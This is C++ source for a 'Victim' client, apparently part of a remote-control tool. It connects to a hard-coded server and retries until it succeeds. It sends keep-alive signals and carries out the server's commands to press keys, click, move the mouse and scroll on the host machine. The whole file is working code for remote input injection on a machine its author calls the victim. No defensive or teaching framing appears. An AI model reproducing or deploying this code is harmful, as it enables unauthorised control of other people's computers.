#include "victim.h"

Victim::Victim()
{    
    //if needed create the context file
    std::ofstream createFile("./vcontext.txt", std::ios::app);
    createFile.close();
    //read the context file
    std::ifstream readFile("./vcontext.txt");
    getline(readFile, name);
    while (name.size() > 0 && name[0] == ' ')
        name.erase(name.begin());
    while (name.size() > 0 && name[name.size() - 1] == ' ')
        name.erase(name.begin() + name.size() - 1);
    readFile.close();

    for (int i = 0; i < 256; i++)
        keysStates[i] = false;
    connectServer();

    std::thread keepAwake(&Victim::keepAwake, this);
    keepAwake.detach();
}

int Victim::controlVictim()
{
    while (isRunning) {
        sf::Packet p;
        server.receive(p);

        if (p.getDataSize() == 0) {
            std::cout << "DISCONNECTED FROM SERVER\n";
            isConnected = false;
            connectServer();
        }

        sf::Uint8 cmd;
        p >> cmd;
        
        //exit program
        if (cmd == 'e') {
            isRunning = false;
        }
        //key pressed-released
        else if (cmd == 'n' || cmd == 'm') {
            sf::Uint8 vkc;
            p >> vkc;

            bool state = (cmd == 'n');
            keysStates[vkc] = state;

            //if its a mouse key, treat it accordingly
            if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), state);
            else
                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), state);
        }
        //mouse moved
        else if (cmd == 'l') {
            sf::Uint16 a, b;
            p >> a >> b;
            float x = a / (256.f * 256.f) * screenSize.x;
            float y = b / (256.f * 256.f) * screenSize.y;
            Mlib::Mouse::setPos(Mlib::Vec2i(x, y));
        }
        //wheel scrolled
        else if (cmd == 'k') {
            sf::Int8 delta;
            p >> delta;
            Mlib::Mouse::simulateScroll(delta * 100.f);
        }
        //release all keys
        else if (cmd == 'a') {
            for (int i = 0; i < 255; i++) {
                if (!keysStates[i])
                    continue;
                keysStates[i] = false;

                //if its a mouse key, treat it accordingly
                if (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06)
                    Mlib::Mouse::setState(Mlib::Mouse::Button(i), false);
                else
                    Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
            }
        }
        //rename 
        else if (cmd == 'w') {
            p >> name;
            std::ofstream file("./vcontext.txt", std::ios::trunc);
            file.write(name.c_str(), name.size());
            file.close();
        }
        //apparently victim isnt initialized
        else if (cmd == '?') {
            isConnected = false;
            connectServer();
        }
    }

    return 0;
}

void Victim::keepAwake()
{
    while (true) {
        if (isConnected && Mlib::getTime() - lastAwakeSignal > 2'000) {
            sf::Packet p;
            p << sf::Uint8('r');
            server.send(p);
            lastAwakeSignal = Mlib::getTime();
        }
        Mlib::sleep(50);
    }
}

void Victim::connectServer()
{
    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
    std::cout << "connected with server\n";

init:
    sf::Uint8 role = '-';
    sf::Packet p;
    p << sf::Uint8('v') << name;
    server.send(p);
    p.clear();
    server.receive(p);
    p >> role;
    if (role != 'v')
        goto init;
    std::cout << "connection with server approved\n";

    isConnected = true;
}
